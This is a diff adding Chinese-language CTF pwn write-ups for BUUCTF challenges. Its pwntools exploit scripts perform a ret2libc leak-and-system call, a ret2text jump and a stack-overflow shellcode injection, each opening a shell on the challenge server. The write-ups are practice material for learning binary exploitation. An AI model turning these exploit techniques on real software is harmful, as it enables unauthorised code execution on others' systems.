@@ -356,3 +356,191 @@ r.sendline(payload)
 r.interactive()
 ```
 
+## 30 jarvisoj_level3
+
+ret2libc
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc-2.19.so")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',28662)
+def dbg():
+    gdb.attach(p)
+    pause()
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+main = elf.sym['main']
+payload = b'b'*0x88+b'b'*0x4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(0x4)
+p.recvuntil('Input:\n')
+p.sendline(payload)
+write_addr = u32(p.recv(4))
+libc = LibcSearcher('write',write_addr)
+libc_base = write_addr-libc.dump('write')
+log.info("libc_base:"+hex(libc_base))
+
+sys = libc_base+libc.dump('system')
+binsh = libc_base+libc.dump('str_bin_sh')
+payload = b'b'*0x88+b'b'*0x4+p32(sys)+p32(0)+p32(binsh)
+p.sendline(payload)
+p.interactive()
+```
+
+## 31 ciscn_2019_s_3
+
+施工中......
+
+## 32 wustctf2020_getshell
+
+ret2text
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',25069)
+def dbg():
+    gdb.attach(p)
+    pause()
+
+payload = b'b'*0x18+b'b'*0x4+p32(0x8048524)
+p.sendline(payload)
+p.interactive()
+```
+
+## 33 ez_pz_hackover_2016 (动态调试入门)
+
+一道很好的动态调试入门题
+
+检查保护
+
+```shell
+[*] '/home/pwn/pwn/buuctf/33/pwn'
+    Arch:       i386-32-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x8048000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+```
+
+保护全关，有可读可写可执行段，可能是`shellcode`
+
+看下题目
+
+![image-20250131225811634](./images/image-20250131225811634.png)
+
+`memchr`函数在网上搜索一下就好，这里不做详细介绍，主要是看到最后有一个比较，如果在`\n`之前为`crasheme`，则可以进入vuln函数
+
+![image-20250131230108221](./images/image-20250131230108221.png)
+
+明显的溢出漏洞，`dest`仅有0x32字节，但是可以读入0x400字节，往里面写入shellcode
+
+**思路**
+
+往s里写入shllcode，执行vuln函数后让dest溢出，将返回地址修改为shellcode的地址
+
+**实施**
+
+但是dest是栈上的数据，一般情况下我们是找不到我们写入的地址的，那就没办法执行shellcode的地址。
+
+执行一次程序可以发现其实程序一开始就把我们输入的地址给我们了
+
+```c
+  printf("Yippie, lets crash: %p\n", s);
+```
+
+那么我们算出shellcode和我们输入的起始位置的偏移，就可以得到shellcode的地址
+
+先写一个测试脚本
+
+```python
+from pwn import *
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+p=process('./pwn')
+context.log_level='debug'
+
+gdb.attach(p,'b *0x8048600')#利用gdb动调，在0x8048600处下了个断点
+
+p.recvuntil('crash: ')
+stack=int(p.recv(10),16)
+print (hex(stack))
+
+payload='crashme\x00'+'aaaaaa'#前面的crashme\x00绕过if判断
+      #后面的aaaa是测试数据，随便输入的，我们等等去栈上找它的地址
+
+pause()
+p.sendline(payload)
+pause()
+```
+
+`0x8048600`是一个`nop`指令的地址，在这里下一个断点，方便调试
+
+![image-20250131231137749](./images/image-20250131231137749.png)
+
+*这里输入地址的结尾是abc*
+
+按c执行下一步，然后输入`stack 50`看一下栈布局
+
+![image-20250131233050407](./images/image-20250131233050407.png)
+
+**解决一下shellcode在栈上的位置（填充多少数据合适）**
+
+可以看到我们输入的crashme有一部分在距离`esp`0x24处，因为没有对齐的原因，cr在上面一行，对应0x63 0x72(小端序)
+
+然后ebp在0x38处，我们输入的参数0x22处（虽然左边标的是0x20，但是有两个字节不是我们输入的，真正输入的是0x72 0x63)，所以ebp距离我们输入点的距离是`0x38-0x22=0x16`，而shellcode是写在ebp后面的，也就是`0x16+0x4`的地方
+
+```python
+payload = b'crashme\x00'+b'a'*(0x16-8+4)+p32(addr)
+```
+
+> crashme\x00占8个字节减去，ebp占4个字节要覆盖
+
+**解决shllcode的地址问题**
+
+上面已经将我们的输入地址打印出来了（结尾是`abc`，在ebp下面）
+
+既然我们只有一次输入机会，那么我们构造完返回地址之后直接跟着shellcode好了，所以直接把地址返回到ebp+8的位置就行
+
+`0xfff9eabc-0xfff9eaa0=0x1c`，所以最终地址偏移为0x1c
+
+最后得到exp
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+#elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+def dbg():
+    gdb.attach(p)
+    pause()
+
+p=remote('node5.buuoj.cn',26858)
+p.recvuntil('crash: ')
+stack_addr=int(p.recv(10),16)
+shellcode=asm(shellcraft.sh())
+
+payload=b'crashme\x00'+b'a'*(0x16-8+4)+p32(stack_addr-0x1c)+shellcode
+p.sendline(payload)
+
+p.interactive()
+```
+
+
+
